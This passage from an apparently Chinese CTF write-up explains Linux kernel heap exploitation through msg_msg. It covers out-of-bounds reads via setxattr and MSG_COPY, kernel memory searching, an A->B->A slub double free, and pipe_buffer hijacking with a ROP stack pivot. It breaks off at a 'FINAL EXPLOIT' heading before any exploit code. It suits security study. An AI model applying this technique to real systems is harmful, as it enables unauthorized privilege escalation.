消息队列相关的系统调用：</p><ul><li>msgget：创建一个消息队列</li><li>msgsnd：向指定消息队列发送消息</li><li>msgrcv：从指定消息队列接接收消息</li></ul><p>当我们创建一个消息队列时，在内核空间中会创建这样一个结构体，其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="type">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="type">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="type">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>而当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>若是消息队列中只有一个消息则是这样：</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>接下来我们来深入 msg_msg 的内部结构，阅读 msgsnd 源码可知，当我们在消息队列上发送一个 message 时，其首先会调用 <code>load_msg</code> 将该 message 拷贝到内核中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">long</span> mtype, <span class="type">void</span> __user *mtext,</span></span><br><span class="line"><span class="params"><span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="type">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">msg = load_msg(mtext, msgsz);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>而 <code>load_msg()</code> 最终会调用到 <code>alloc_msg()</code> 分配所需的空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">load_msg</span><span class="params">(<span class="type">const</span> <span class="type">void</span> __user *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"><span class="type">int</span> err = -EFAULT;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">msg = alloc_msg(len);</span><br></pre></td></tr></table></figure><p>阅读 <code>alloc_msg()</code> 源码可以发现，其以 msg_msg 结构体为核心生成如下结构：</p><ul><li>对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据</li><li>对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 <code>msg_msgseg</code> 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个<strong>单向链表</strong>，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL</li></ul><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>我们不难想到的是，我们可以分配一个大小为 1024 的 msg_msg 结构体作为 victim，利用 setxattr 系统调用修改其 header 中的 <code>m_ts</code> 成员，<strong>从而实现堆上的越界数据读取</strong>，同时还能通过修改 msg_msg-&gt;next <strong>实现任意地址读</strong></p><p>但是这样有一个问题，当我们调用 msgrcv 接受消息时，其会调用 <code>list_del()</code> 将对应的 msg_msg 结构体从双向链表中 unlink，<strong>此时我们并不知道内核空间中的任何地址，因此内核会在 unlink 时 panic 掉</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> __user *buf, <span class="type">size_t</span> bufsz, <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg,</span></span><br><span class="line"><span class="params">       <span class="type">long</span> (*msg_handler)(<span class="type">void</span> __user *, <span class="keyword">struct</span> msg_msg *, <span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    list_del(&amp;msg-&gt;m_list);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock0:</span><br><span class="line">ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">free_copy(copy);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们需要想一个方法既能读出 msg_msg 中数据又不会让其被非法 unlink 掉，阅读源码我们会发现，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则<strong>内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</strong>，从而我们便可以多次重复地读取同一个 <code>msg_msg</code> 结构体中数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line"><span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">copy = prepare_copy(buf, <span class="type">min_t</span>(<span class="type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment"> * not update queue parameters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">msg = copy_msg(msg, copy);</span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>接下来我们考虑越界读取的详细过程，我们首先可以利用 setxattr 修改 msg_msg 的 <code>next</code> 指针为 NULL、将其 <code>m_ts</code> 改为 <code>0x1000 - 0x30</code>（在 next 指针为 NULL 的情况下，一个 msg_msg 结构体最大占用一张内存页的大小），从而越界读出内核堆上数据</p><p>接下来我们思考如何进行“合法”的搜索，我们先来看 <code>copy_msg</code> 的逻辑，其拷贝时判断待数据长度的逻辑<strong>主要是看 next 指针</strong>，因此若我们的 next 指针为一个非法地址，则会在解引用时导致 kernel panic</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">copy_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *src, <span class="keyword">struct</span> msg_msg *dst)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line"><span class="type">size_t</span> len = src-&gt;m_ts;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">     src_pseg != <span class="literal">NULL</span>;</span><br><span class="line">     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">len -= alen;</span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们需要确保<strong>获得一个合法的堆上地址进行搜索的同时</strong>确保我们所构造的<strong>next 链上皆为合法地址，并以 NULL 结尾</strong>，如何找到这样一个地址？</p><p>我们都知道，slub 会向 buddy system 申请一张或多张连续内存页，将其分割为指定大小的 object 之后再返还给 kmalloc 的 caller，对于大小为 1024 的 object，其每次申请的连续内存页为四张，分为 16 个 object</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">cat</span> /proc/sla</span> </span><br><span class="line">Password: </span><br><span class="line">slabinfo - version: 2.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;<span class="built_in">limit</span>&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">...</span></span><br><span class="line">kmalloc-1k          3341   3584   1024   16    4 : tunables    0    0    0 : slabdata    224    224      0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">...</span></span><br></pre></td></tr></table></figure><p>我们不难想到的是，若是我们<strong>分配多个大小同为 1024 的 msg_msg 结构体，则其很容易落在地址连续的 4 张内存页上</strong>，此时若是我们从其中一个 msg_msg 结构体向后进行越界读，<strong>则很容易读取到其他的 msg_msg 结构体的数据</strong>，其 m_list 成员可以帮助我们泄露出一个堆上地址</p><p>那么这个堆上地址指向哪呢？让我们将目光重新放回 <code>msg_queue</code> 与 <code>msg_msg</code> 结构体之间的关系，当一个消息上只有一个 message 时，我们不难看出 msg_msg 的 prev 与 next 指针都指向 msg_queue 的 <code>q_messages</code> 域，对应地， msg_queue-&gt;q_message 的 prev 与 next 也同样指向 msg_msg 的 <code>m_list</code> 域</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>此时我们不难想到，<strong>我们可以将 msg_msg 的 next 指针指回 msg_queue，从而读出上面的指向 msg_msg 的指针，将未知的地址变为已知的地址</strong>，之后我们在搜索时便可以选择从该地址开始搜索，这样我们就能知道每次搜索时获得的每一条数据的地址，<strong>从而在每次搜索时能够挑选已知数据为 NULL 的区域作为 next-&gt;next 以避免 kernel panic</strong>，以此获得连续的搜索内存的能力</p><p>但是这有一个小要求，我们在泄露 msg_msg 地址时应当选取 msg_queue-&gt;q_message 往前的一块为 NULL 的区域作为 msg_msg-&gt;next，不过令笔者欣喜的是，<code>msg_queue-&gt;q_lrpid</code> 在未使用 msgrcv 接收消息时<strong>为 NULL</strong>，该成员在 q_message 成员向前的 8 字节处，因此我们可以将 next 指针指向这个位置</p><p><img src="https://s2.loli.net/2022/02/25/5fOESRbu6Zan7mU.png" alt="image.png"></p><p>泄露出 msg_msg 的地址之后就可以开始愉快的内存搜索了，至于在泄露出内核代码段上指针后如何计算出内核代码段基址，笔者这里的做法比较笨：将经常出现的内核指针做成一个字典，之后直接 query 即可，若字典未命中则继续搜索</p><blockquote><p>可能有的人会想到一个更为快捷的办法：因为我们已经获得了内核的“堆上地址”，所以我们可以去猜测“堆的基址”（<code>page_offset_base</code>），在 <code>page_offset_base + 0x9d000</code> 处<strong>固定存放着</strong> <code>secondary_startup_64</code> 函数的地址，而这个地址前面刚好有一片为 0 的区域方便我们的 next 指针进行指向</p><p>但这个做法有一定的风险：若是我们猜错了则很容易导致 kernel panic，且经笔者尝试会在我们的下一步中<strong>导致 kernel panic</strong>（也可能是笔者的构造存在缺陷），所以笔者还是更推荐大家只用内存搜索的办法</p></blockquote><h3 id="Step-III-构造-A-gt-B-gt-A-式-freelist-劫持新的结构体"><a href="#Step-III-构造-A-gt-B-gt-A-式-freelist-劫持新的结构体" class="headerlink" title="Step.III 构造 A-&gt;B-&gt;A 式 freelist 劫持新的结构体"></a>Step.III 构造 A-&gt;B-&gt;A 式 freelist 劫持新的结构体</h3><p>现在地址泄露的工作已经完成了，接下来我们来考虑如何进行提权，比较朴素的提权方法有两种：修改进程 cred 结构体或是劫持内核执行流</p><p>对于前一种方法我们需要获得内核中的任意地址写，可能此时有的同学已经想到了利用 userfaultfd + msg_msg 这一任意写方法，而现在我们有着内存搜索技术，自然可以直接使用 prctl 设置 task_struct 的 comm 成员后进行暴力搜索，但首先<strong>我们并不知道 PCB 地址在当前已知堆地址的前方还是后方</strong>，无论搜索前向越界还是后向越界到了非法地址都会引起 kernel panic，且自内核版本 5.11 起 <strong>userfaultfd 系统调用被限制为 root 权限才能使用</strong>，因此笔者选择控制一些有着函数指针的结构体从而劫持内核执行流</p><p>那么我们要将该 object 分配到别的地方，还要能对其进行修改，那么我们<strong>必须要先将该 object 放回 slub 中</strong>，因为此时该 object 虽为 free 状态，但当我们将其分配到别的结构体上后<strong>我们便无法再控制其内容</strong>，因为此时原 msg_msg 结构体的数据会被新结构体覆盖，<strong>无法正常被释放</strong>（过不了 msgrcv 中的 unlink）</p><p>因此接下来我们的工作便是先维修 msg_msg 中的双向链表，让其指向内核堆上一个合法的地址，同时让 next 指针为 NULL 即可，这里我们可以直接选择使用 setxattr 完成修复，可能有的同学这里会有疑问：m_list 成员位于 msg_msg 的前 16 字节，在 setxattr 将其放回 slub 时<strong>难道不会又将其修改为一个 slub 中的指针从而破坏双向链表么</strong>？开启了 hardened freelist 保护时 free object 的 next 指针字面量并非一个合法地址。这里我们就要说到 slub 的一个特性了：</p><ul><li>不同于 glibc 中空闲堆块固定使用前 8 字节的组织方式，在 slub 中空闲的 object 在其对应的 kmem_cache-&gt;offset 处存放下一个 free object 的指针（开启了 hardened freelist 保护时该值为当前 object 与 下一个 object 地址再与一个 random 值总共三个值进行异或的结果）</li></ul><p>经笔者多次测试，对于这种较大的 object 而言，其 offset 通常会大于 msg_msg header 的大小，因此我们可以进行完美修复</p><p>修复完成之后我们考虑如何进行 double free，因为 slub 的释放函数并没有太多的保护，如同 glibc 中的 fastbin 一般只会检查 freelist 上的第一个 object，因此我们只需要像做用户态 pwn 题那样构造 A-&gt;B-&gt;A 的释放链便能将 UAF 再应用到其他内核结构体上</p><h3 id="Step-IV-pipe-buffer-劫持-RIP"><a href="#Step-IV-pipe-buffer-劫持-RIP" class="headerlink" title="Step.IV pipe_buffer 劫持 RIP"></a>Step.IV pipe_buffer 劫持 RIP</h3><p>最后我们来挑选一个内核结构体来劫持 RIP，这里笔者选择了 <code>pipe_buffer</code> 这一结构体，当我们创建一个管道时，在内核中会生成数个连续的该结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，因此我们只需要劫持其函数表即可，劫持的位置也很清晰：前面我们在搜索内存时获取到了其中一个 msg_msg 的地址，只需要减去其与被用于 UAF 的 object 的地址之间的偏移即可，这个偏移值在搜索过程中是可以计算出来的</p><p>之后我们将函数表劫持到 pipe_buffer 所处 object 上，在该 object 上布置好 ROP 链，再选一条合适的用于栈迁移的 gadget 即可</p><p>经笔者实测，此时的 rsi 寄存器指向 pipe_buffer，因此笔者选择了一条 <code>push rsi ; pop rsp ; pop 4 vals ; ret</code> 的 gadget 完成栈迁移</p><p><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" alt="image.png"></p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span 